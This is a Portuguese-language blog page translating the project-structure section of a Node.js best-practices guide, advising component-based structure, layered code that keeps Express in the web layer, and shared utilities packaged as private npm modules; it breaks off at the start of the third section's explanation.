<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style id="typography.js">html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block}audio:not([controls]){display:none;height:0}progress{vertical-align:baseline}[hidden],template{display:none}a{background-color:transparent;-webkit-text-decoration-skip:objects}a:active,a:hover{outline-width:0}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:inherit;font-weight:bolder}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}svg:not(:root){overflow:hidden}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}button,input,optgroup,select,textarea{font:inherit;margin:0}optgroup{font-weight:700}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-input-placeholder{color:inherit;opacity:.54}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{font:100%/1.75 'Merriweather','Georgia',serif;box-sizing:border-box;overflow-y:scroll;}*{box-sizing:inherit;}*:before{box-sizing:inherit;}*:after{box-sizing:inherit;}body{color:hsla(0,0%,0%,0.9);font-family:'Merriweather','Georgia',serif;font-weight:400;word-wrap:break-word;font-kerning:normal;-moz-font-feature-settings:"kern", "liga", "clig", "calt";-ms-font-feature-settings:"kern", "liga", "clig", "calt";-webkit-font-feature-settings:"kern", "liga", "clig", "calt";font-feature-settings:"kern", "liga", "clig", "calt";}img{max-width:100%;margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;}h1{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;color:inherit;font-family:Montserrat,sans-serif;font-weight:900;text-rendering:optimizeLegibility;font-size:2.5rem;line-height:1.1;}h2{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;color:inherit;font-family:'Merriweather','Georgia',serif;font-weight:900;text-rendering:optimizeLegibility;font-size:1.73286rem;line-height:1.1;}h3{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;color:inherit;font-family:'Merriweather','Georgia',serif;font-weight:900;text-rendering:optimizeLegibility;font-size:1.4427rem;line-height:1.1;}h4{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;color:inherit;font-family:'Merriweather','Georgia',serif;font-weight:900;text-rendering:optimizeLegibility;font-size:1rem;line-height:1.1;letter-spacing:0.140625em;text-transform:uppercase;}h5{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;color:inherit;font-family:'Merriweather','Georgia',serif;font-weight:900;text-rendering:optimizeLegibility;font-size:0.83255rem;line-height:1.1;}h6{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;color:inherit;font-family:'Merriweather','Georgia',serif;font-weight:900;text-rendering:optimizeLegibility;font-size:0.75966rem;line-height:1.1;font-style:italic;}hgroup{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;}ul{margin-left:1.75rem;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;list-style-position:outside;list-style-image:none;list-style:disc;}ol{margin-left:1.75rem;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;list-style-position:outside;list-style-image:none;}dl{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;}dd{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;}p{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;}figure{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;}pre{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;font-size:0.85rem;line-height:1.75rem;}table{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;font-size:1rem;line-height:1.75rem;border-collapse:collapse;width:100%;}fieldset{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;}blockquote{margin-left:-1.75rem;margin-right:1.75rem;margin-top:0;padding-bottom:0;padding-left:1.42188rem;padding-right:0;padding-top:0;margin-bottom:1.75rem;font-size:1.20112rem;line-height:1.75rem;color:hsla(0,0%,0%,0.59);font-style:italic;border-left:0.32813rem solid hsla(0,0%,0%,0.9);}form{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;}noscript{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;}iframe{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;}hr{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:calc(1.75rem - 1px);background:hsla(0,0%,0%,0.2);border:none;height:1px;}address{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.75rem;}b{font-weight:700;}strong{font-weight:700;}dt{font-weight:700;}th{font-weight:700;}li{margin-bottom:calc(1.75rem / 2);}ol li{padding-left:0;}ul li{padding-left:0;}li > ol{margin-left:1.75rem;margin-bottom:calc(1.75rem / 2);margin-top:calc(1.75rem / 2);}li > ul{margin-left:1.75rem;margin-bottom:calc(1.75rem / 2);margin-top:calc(1.75rem / 2);}blockquote *:last-child{margin-bottom:0;}li *:last-child{margin-bottom:0;}p *:last-child{margin-bottom:0;}li > p{margin-bottom:calc(1.75rem / 2);}code{font-size:0.85rem;line-height:1.75rem;}kbd{font-size:0.85rem;line-height:1.75rem;}samp{font-size:0.85rem;line-height:1.75rem;}abbr{border-bottom:1px dotted hsla(0,0%,0%,0.5);cursor:help;}acronym{border-bottom:1px dotted hsla(0,0%,0%,0.5);cursor:help;}abbr[title]{border-bottom:1px dotted hsla(0,0%,0%,0.5);cursor:help;text-decoration:none;}thead{text-align:left;}td,th{text-align:left;border-bottom:1px solid hsla(0,0%,0%,0.12);font-feature-settings:"tnum";-moz-font-feature-settings:"tnum";-ms-font-feature-settings:"tnum";-webkit-font-feature-settings:"tnum";padding-left:1.16667rem;padding-right:1.16667rem;padding-top:0.875rem;padding-bottom:calc(0.875rem - 1px);}th:first-child,td:first-child{padding-left:0;}th:last-child,td:last-child{padding-right:0;}blockquote > :last-child{margin-bottom:0;}blockquote cite{font-size:1rem;line-height:1.75rem;color:hsla(0,0%,0%,0.9);font-weight:400;}blockquote cite:before{content:"— ";}ul,ol{margin-left:0;}@media only screen and (max-width:480px){ul,ol{margin-left:1.75rem;}blockquote{margin-left:-1.3125rem;margin-right:0;padding-left:0.98438rem;}}h1,h2,h3,h4,h5,h6{margin-top:3.5rem;}a{box-shadow:0 1px 0 0 currentColor;color:#007acc;text-decoration:none;}a:hover,a:active{box-shadow:none;}mark,ins{background:#007acc;color:white;padding:0.10938rem 0.21875rem;text-decoration:none;}a.gatsby-resp-image-link{box-shadow:none;}</style><style data-href="/styles.866ebd72613d3c965573.css" id="gatsby-global-css">@font-face{font-family:Montserrat;font-style:normal;font-display:swap;font-weight:100;src:local("Montserrat Thin "),local("Montserrat-Thin"),url(/static/montserrat-latin-100-191cc9f50f3b76b9617cb383f19acb7d.woff2) format("woff2"),url(/static/montserrat-latin-100-370318464551d5f25b0f0a78f374faac.woff) format("woff")}@font-face{font-family:Montserrat;font-style:italic;font-display:swap;font-weight:100;src:local("Montserrat Thin italic"),local("Montserrat-Thinitalic"),url(/static/montserrat-latin-100italic-bdeaeb79db315697bd173a55b097dc18.woff2) format("woff2"),url(/static/montserrat-latin-100italic-ecf7d49386e8f265878e735db34a7c4b.woff) format("woff")}@font-face{font-family:Montserrat;font-style:normal;font-display:swap;font-weight:200;src:local("Montserrat Extra Light "),local("Montserrat-Extra Light"),url(/static/montserrat-latin-200-85d5ef9db7f2dc6979172a4a3b2c57cb.woff2) format("woff2"),url(/static/montserrat-latin-200-1fc98e126a3d152549240e6244d7e669.woff) format("woff")}@font-face{font-family:Montserrat;font-style:italic;font-display:swap;font-weight:200;src:local("Montserrat Extra Light italic"),local("Montserrat-Extra Lightitalic"),url(/static/montserrat-latin-200italic-49095760a498d024fe1a85a078850df9.woff2) format("woff2"),url(/static/montserrat-latin-200italic-fe46cf8b9462c820457d3bf537e4057f.woff) format("woff")}@font-face{font-family:Montserrat;font-style:normal;font-display:swap;font-weight:300;src:local("Montserrat Light "),local("Montserrat-Light"),url(/static/montserrat-latin-300-7c3daf12b706645b5d3710f863a4da04.woff2) format("woff2"),url(/static/montserrat-latin-300-8dc95fab9cf98d02ca8d76e97d3dff60.woff) format("woff")}@font-face{font-family:Montserrat;font-style:italic;font-display:swap;font-weight:300;src:local("Montserrat Light italic"),local("Montserrat-Lightitalic"),url(/static/montserrat-latin-300italic-f20b178ca2024a5eac8e42e6649db86c.woff2) format("woff2"),url(/static/montserrat-latin-300italic-3fe16939288856e8e828fa2661bf2354.woff) format("woff")}@font-face{font-family:Montserrat;font-style:normal;font-display:swap;font-weight:400;src:local("Montserrat Regular "),local("Montserrat-Regular"),url(/static/montserrat-latin-400-bc3aa95dca08f5fee5291e34959c27bc.woff2) format("woff2"),url(/static/montserrat-latin-400-8102c4838f9e3d08dad644290a9cb701.woff) format("woff")}@font-face{font-family:Montserrat;font-style:italic;font-display:swap;font-weight:400;src:local("Montserrat Regular italic"),local("Montserrat-Regularitalic"),url(/static/montserrat-latin-400italic-5cad650422a7184467af5a4d17b264c4.woff2) format("woff2"),url(/static/montserrat-latin-400italic-d191f22af3bb50902b99ac577f81a322.woff) format("woff")}@font-face{font-family:Montserrat;font-style:normal;font-display:swap;font-weight:500;src:local("Montserrat Medium "),local("Montserrat-Medium"),url(/static/montserrat-latin-500-92d16e458625f4d2c8940f6bdca0ff09.woff2) format("woff2"),url(/static/montserrat-latin-500-8b763220218ffc11c57c84ddb80e7b26.woff) format("woff")}@font-face{font-family:Montserrat;font-style:italic;font-display:swap;font-weight:500;src:local("Montserrat Medium italic"),local("Montserrat-Mediumitalic"),url(/static/montserrat-latin-500italic-47bfcca6b69d6a9acca7a8bff17193e2.woff2) format("woff2"),url(/static/montserrat-latin-500italic-72c01f753c3940c0b9cb6bf2389caddf.woff) format("woff")}@font-face{font-family:Montserrat;font-style:normal;font-display:swap;font-weight:600;src:local("Montserrat SemiBold "),local("Montserrat-SemiBold"),url(/static/montserrat-latin-600-6fb1b5623e528e27c18658fecf5ee0ee.woff2) format("woff2"),url(/static/montserrat-latin-600-7c839d15a6f54e7025ba8c0c4b333e8f.woff) format("woff")}@font-face{font-family:Montserrat;font-style:italic;font-display:swap;font-weight:600;src:local("Montserrat SemiBold italic"),local("Montserrat-SemiBolditalic"),url(/static/montserrat-latin-600italic-60789af1c9338ed1a9546722ec54b4f7.woff2) format("woff2"),url(/static/montserrat-latin-600italic-f3d4de8d0afb19e777c79032ce828e3d.woff) format("woff")}@font-face{font-family:Montserrat;font-style:normal;font-display:swap;font-weight:700;src:local("Montserrat Bold "),local("Montserrat-Bold"),url(/static/montserrat-latin-700-39d93cf678c740f9f6b2b1cfde34bee3.woff2) format("woff2"),url(/static/montserrat-latin-700-80f10bd382f0df1cd650fec59f3c9394.woff) format("woff")}@font-face{font-family:Montserrat;font-style:italic;font-display:swap;font-weight:700;src:local("Montserrat Bold italic"),local("Montserrat-Bolditalic"),url(/static/montserrat-latin-700italic-ba136d97b14e82284dd595e257f11c47.woff2) format("woff2"),url(/static/montserrat-latin-700italic-8c98142b425630821139c24bd1698700.woff) format("woff")}@font-face{font-family:Montserrat;font-style:normal;font-display:swap;font-weight:800;src:local("Montserrat ExtraBold "),local("Montserrat-ExtraBold"),url(/static/montserrat-latin-800-b7018be9ed6cd94da8b6675b3a468c3b.woff2) format("woff2"),url(/static/montserrat-latin-800-9a9befcf50d64f9d2d19d8b1d1984add.woff) format("woff")}@font-face{font-family:Montserrat;font-style:italic;font-display:swap;font-weight:800;src:local("Montserrat ExtraBold italic"),local("Montserrat-ExtraBolditalic"),url(/static/montserrat-latin-800italic-540ffdd223d1a9ad3d4e678e1a23372e.woff2) format("woff2"),url(/static/montserrat-latin-800italic-897086f99f4e1f45e6b1e9368527d0bc.woff) format("woff")}@font-face{font-family:Montserrat;font-style:normal;font-display:swap;font-weight:900;src:local("Montserrat Black "),local("Montserrat-Black"),url(/static/montserrat-latin-900-58cd789700850375b834e8b6776002eb.woff2) format("woff2"),url(/static/montserrat-latin-900-26d42c9428780e545a540bbb50c84bce.woff) format("woff")}@font-face{font-family:Montserrat;font-style:italic;font-display:swap;font-weight:900;src:local("Montserrat Black italic"),local("Montserrat-Blackitalic"),url(/static/montserrat-latin-900italic-451157bc8861fe54f523b3669a3def71.woff2) format("woff2"),url(/static/montserrat-latin-900italic-a8ec4957e1c24f5793305763ad9845b3.woff) format("woff")}@font-face{font-family:Merriweather;font-style:normal;font-display:swap;font-weight:300;src:local("Merriweather Light "),local("Merriweather-Light"),url(/static/merriweather-latin-300-b1158cfcd4aacb9d8fb61625e37af46a.woff2) format("woff2"),url(/static/merriweather-latin-300-cc7de05e166e90320d7d896e0f72a19d.woff) format("woff")}@font-face{font-family:Merriweather;font-style:italic;font-display:swap;font-weight:300;src:local("Merriweather Light italic"),local("Merriweather-Lightitalic"),url(/static/merriweather-latin-300italic-8fe52a48089d6ebe46db0b8e7cc66263.woff2) format("woff2"),url(/static/merriweather-latin-300italic-e1331f5397c2a673f9d3765138debdb5.woff) format("woff")}@font-face{font-family:Merriweather;font-style:normal;font-display:swap;font-weight:400;src:local("Merriweather Regular "),local("Merriweather-Regular"),url(/static/merriweather-latin-400-8276fdb72ae8f4714d4e6eba704cc39f.woff2) format("woff2"),url(/static/merriweather-latin-400-69f09800f4f6479d06e44eba837df872.woff) format("woff")}@font-face{font-family:Merriweather;font-style:italic;font-display:swap;font-weight:400;src:local("Merriweather Regular italic"),local("Merriweather-Regularitalic"),url(/static/merriweather-latin-400italic-3a9be9ea9f7aa4af6de7307df21d9fc0.woff2) format("woff2"),url(/static/merriweather-latin-400italic-d76079ed7541a433a54f79316de086e9.woff) format("woff")}@font-face{font-family:Merriweather;font-style:normal;font-display:swap;font-weight:700;src:local("Merriweather Bold "),local("Merriweather-Bold"),url(/static/merriweather-latin-700-fa534be7ffa380e39a7f6e03bf9a5e03.woff2) format("woff2"),url(/static/merriweather-latin-700-ba56ea84b8084b7ff9677f50d3cd81bd.woff) format("woff")}@font-face{font-family:Merriweather;font-style:italic;font-display:swap;font-weight:700;src:local("Merriweather Bold italic"),local("Merriweather-Bolditalic"),url(/static/merriweather-latin-700italic-1ef5edaaa20ae53ea50399884c5e48c6.woff2) format("woff2"),url(/static/merriweather-latin-700italic-534bc9e7ce93c73d73426e46acd78092.woff) format("woff")}@font-face{font-family:Merriweather;font-style:normal;font-display:swap;font-weight:900;src:local("Merriweather Black "),local("Merriweather-Black"),url(/static/merriweather-latin-900-7528fb70e8a4a82c7305e72ff43ac25f.woff2) format("woff2"),url(/static/merriweather-latin-900-3799b6e2f5ed3fcccf9d7a708d7419fa.woff) format("woff")}@font-face{font-family:Merriweather;font-style:italic;font-display:swap;font-weight:900;src:local("Merriweather Black italic"),local("Merriweather-Blackitalic"),url(/static/merriweather-latin-900italic-e1b4d2aaa78e12ad84aaf8a56321e4c2.woff2) format("woff2"),url(/static/merriweather-latin-900italic-2ae22f731b3424e8dbb4b37f7ca6e708.woff) format("woff")}code[class*=language-],pre[class*=language-]{color:#f8f8f2;background:none;text-shadow:0 1px rgba(0,0,0,.3);font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;text-align:left;white-space:break-spaces;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto;border-radius:.3em}:not(pre)>code[class*=language-],pre[class*=language-]{background:#272822}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#8292a2}.token.punctuation{color:#f8f8f2}.token.namespace{opacity:.7}.token.constant,.token.deleted,.token.property,.token.symbol,.token.tag{color:#f92672}.token.boolean,.token.number{color:#ae81ff}.token.attr-name,.token.builtin,.token.char,.token.inserted,.token.selector,.token.string{color:#a6e22e}.language-css .token.string,.style .token.string,.token.entity,.token.operator,.token.url,.token.variable{color:#f8f8f2}.token.atrule,.token.attr-value,.token.class-name,.token.function{color:#e6db74}.token.keyword{color:#66d9ef}.token.important,.token.regex{color:#fd971f}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}</style><meta name="generator" content="Gatsby 2.28.1"/><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="preconnect" href="https://www.google-analytics.com"/><link rel="dns-prefetch" href="https://www.google-analytics.com"/><script>
  !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
  n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
  document,'script','https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '2374911412821725'); // Insert your pixel ID here.
  fbq('track', 'PageView');
      </script><script>window.dataLayer = window.dataLayer || [];window.dataLayer.push({"platform":"plataforma-reativa"}); (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src= 'https://www.googletagmanager.com/gtm.js?id='+i+dl+'';f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer', 'GTM-KZH8KWD');</script><link rel="alternate" type="application/rss+xml" href="/rss.xml"/><link rel="icon" href="/favicon-32x32.png?v=d2742f2dddd737dec60ee2a5226edb06" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><meta name="theme-color" content="#663399"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=d2742f2dddd737dec60ee2a5226edb06"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=d2742f2dddd737dec60ee2a5226edb06"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=d2742f2dddd737dec60ee2a5226edb06"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=d2742f2dddd737dec60ee2a5226edb06"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=d2742f2dddd737dec60ee2a5226edb06"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=d2742f2dddd737dec60ee2a5226edb06"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=d2742f2dddd737dec60ee2a5226edb06"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=d2742f2dddd737dec60ee2a5226edb06"/><title data-react-helmet="true">NodeJS Guia de boas práticas | Reativa Tecnologia</title><meta data-react-helmet="true" name="description" content="Guia avançado de boas práticas em NodeJS"/><meta data-react-helmet="true" property="og:title" content="NodeJS Guia de boas práticas"/><meta data-react-helmet="true" property="og:description" content="Guia avançado de boas práticas em NodeJS"/><meta data-react-helmet="true" property="og:type" content="website"/><meta data-react-helmet="true" name="twitter:card" content="summary"/><meta data-react-helmet="true" name="twitter:creator" content="Reativa"/><meta data-react-helmet="true" name="twitter:title" content="NodeJS Guia de boas práticas"/><meta data-react-helmet="true" name="twitter:description" content="Guia avançado de boas práticas em NodeJS"/><link as="script" rel="preload" href="/webpack-runtime-21c9d4a6b4882039bec8.js"/><link as="script" rel="preload" href="/styles-755093da0c07f4b49226.js"/><link as="script" rel="preload" href="/framework-8e528b732ab2eaadb7b7.js"/><link as="script" rel="preload" href="/532a2f07-8d0154c2cf59560b38a4.js"/><link as="script" rel="preload" href="/app-6d831502f5b033c00c9a.js"/><link as="script" rel="preload" href="/commons-8efd3e762cdb1d39fca0.js"/><link as="script" rel="preload" href="/cd7d5f864fc9e15ed8adef086269b0aeff617554-1c0ef869a859675a1e93.js"/><link as="script" rel="preload" href="/component---src-templates-blog-post-js-eea8ccbf252e87f3a147.js"/><link as="fetch" rel="preload" href="/page-data/nodebestpractices/1/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/1061827086.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/63159454.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KZH8KWD" height="0" width="0" style="display: none; visibility: hidden" aria-hidden="true"></iframe></noscript><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div style="margin-left:auto;margin-right:auto;max-width:42rem;padding:2.625rem 1.3125rem"><header><h3 style="font-family:Montserrat, sans-serif;margin-top:0">Reativa Tecnologia</h3></header><main><article><header><h1 style="margin-top:1.75rem;margin-bottom:0">NodeJS Guia de boas práticas</h1></header><section><hr>
<p><a href="https://bit.ly/guia-dev-autodidata" target="_blank" rel="nofollow noopener noreferrer"><img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7hVBz-Hb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8gzg05gjkm2e6kl2ckuw.png" alt="Apostila avançada de Nodejs"></a></p>
<hr>
<h1><code class="language-text">1. Práticas de Estrutura de Projeto</code></h1>
<h2>1.1 Estruture sua solução por componentes</h2>
<p><strong>TL;DR:</strong> A pior armadilha das grandes aplicações é manter uma enorme base de código com centenas de dependências - tal qual as monolíticas, que diminuem a velocidade dos desenvolvedores conforme eles tentam incorporar novos recursos. Em vez disso, particione seu código em componentes, cada um com sua própria pasta ou uma base de código dedicada, e garanta cada unidade seja mantida pequena e simples. Veja o link ‘Leia Mais’ abaixo, para ver exemplos de estrutura correta de projeto.</p>
<p><strong>Caso contrário:</strong> Quando desenvolvendo novos recursos, desenvolvedores têm dificuldade para perceber o impacto de suas modificações e temem estragar outros componentes dependentes - deploys se tornam mais lentos e arriscados. Também é considerado mais difícil de escalar quando nenhuma unidade de negócio está separada.</p>
<h1>Estruture sua solução por componentes</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Para aplicações de tamanho médio e acima, os monólitos são muito ruins - ter um grande software com muitas dependências é difícil de avaliar e, muitas vezes, leva ao código de espaguete. Mesmo arquitetos inteligentes - aqueles que são habilidosos o suficiente para domar a fera e “modulá-la” - gastam muito esforço mental no projeto, e cada mudança requer uma avaliação cuidadosa do impacto em outros objetos dependentes. A solução final é desenvolver um software pequeno: dividir a pilha inteira em componentes independentes que não compartilham arquivos com outros, cada um constituindo poucos arquivos (por exemplo, API, serviço, acesso a dados, teste, etc.), de modo que é muito fácil de entender. Alguns podem chamar isso de arquitetura de ‘microserviços’ - é importante entender que os microsserviços não são uma especificação que você deve seguir, mas sim um conjunto de princípios. Você pode adotar muitos princípios em uma arquitetura completa de microsserviços ou adotar apenas alguns. Ambos são bons, desde que você mantenha baixa a complexidade do software. O mínimo que você deve fazer é criar bordas básicas entre os componentes, atribuir uma pasta na raiz do projeto para cada componente de negócios e torná-lo independente - outros componentes podem consumir sua funcionalidade somente por meio de sua interface pública ou API. Esta é a base para manter seus componentes simples, evitar o inferno de dependências e preparar o caminho para microsserviços completos no futuro, assim que seu aplicativo crescer.</p>
<h3>Citação de Blog: “O escalonamento requer escalonamento de todo o aplicativo”</h3>
<p> Do blog MartinFowler.com</p>
<blockquote>
<p>Aplicações monolíticas podem ser bem-sucedidas, mas cada vez mais as pessoas estão sentindo frustrações com elas - especialmente à medida que mais aplicativos são implantados na nuvem. Os ciclos de mudança estão interligados - uma alteração feita em uma pequena parte do aplicativo requer que todo o monólito seja reconstruído e implantado. Ao longo do tempo, muitas vezes é difícil manter uma boa estrutura modular, tornando mais difícil manter as alterações que devem afetar apenas um módulo dentro desse módulo. O escalonamento requer escalonamento de todo o aplicativo, em vez de partes dele que exigem maior recurso.</p>
</blockquote>
<h3>Citação de Blog: “Então, o que a arquitetura do seu aplicativo grita?”</h3>
<p> Do blog <a href="https://8thlight.com/blog/uncle-bob/2011/09/30/Screaming-Architecture.html" target="_blank" rel="nofollow noopener noreferrer">uncle-bob</a> </p>
<blockquote>
<p>…se você estivesse olhando para a arquitetura de uma biblioteca, provavelmente veria uma grande entrada, uma área para funcionários de check-in-out, áreas de leitura, pequenas salas de conferência e galeria após galeria, capaz de guardar estantes de livros para todos os livros. a biblioteca. Essa arquitetura iria gritar: Biblioteca.</p>
</blockquote>
<p>Então, o que a arquitetura da sua aplicação grita? Quando você olha para a estrutura de diretório de nível superior e os arquivos de origem no pacote de nível mais alto; Eles gritam: sistema de saúde ou sistema de contabilidade ou sistema de gerenciamento de estoque? Ou eles gritam: Rails, ou Spring/Hibernate, ou ASP?.</p>
<h3>Bom: estruture sua solução por componentes independentes</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/structurebycomponents.PNG?raw=true" alt="alt text" title="Solução de estruturação por componentes"></p>
<h3>Ruim: Agrupe seus arquivos por papel técnico</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/structurebyroles.PNG?raw=true" alt="alt text" title="Solução de estruturação por funções técnicas"></p>
<h2>1.2 Coloque seus Componentes em Camadas, mantenha o Express dentro de seus limites</h2>
<p><strong>TL;DR:</strong> Cada componente deve conter ‘layers’ (camadas) - um objeto dedicado para web, lógica e código de acesso a dados. Isso não apenas faz uma separação clara dos interesses, como também facilita significativamente os mocks e testes de sistema. Embora este seja um padrão muito comum, desenvolvedores de API tendem a misturar camadas, passando os objetos da camada Web (req e res do Express) para a lógica de negócios e camadas de dados - isto torna sua aplicação dependente, e acessível apenas pelo Express.</p>
<p><strong>Caso contrário:</strong> Uma aplicação que misture objetos WEB com outras camadas não podem ser acessadas por códigos de teste, CRON jobs e outras chamadas não oriundas do Express.</p>
<h1>Coloque seus Componentes em Camadas, mantenha o Express dentro de seus limites</h1>
<h3>Separe o código do componente em camadas: web, serviços e DAL</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/structurebycomponents.PNG?raw=true" alt="alt text" title="Separe o código do componente em camadas"></p>
<h3>Explicação em 1 minuto: A desvantagem de misturar camadas</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/keepexpressinweb.gif?raw=true" alt="alt text" title="A desvantagem de misturar camadas"></p>
<h2>1.3 Envolva os utilitários comuns como pacotes npm</h2>
<p><strong>TL;DR:</strong> Em uma grande aplicação, que constitui uma grande base de código, utilidades de características transversais tais como logger, encriptação e afins, devem ser envolvidos pelo seu próprio código e exposto como pacotes npm privados. Isso permite compartilhá-los entre várias bases de código e projetos.</p>
<p><strong>Caso contrário:</strong> Você deverá criar seu próprio ciclo de implantação e dependência.</p>
<h1>Envolva os utilitários comuns como pacotes npm</h1>
<h3>Explicação em um Parágrafo</h3>
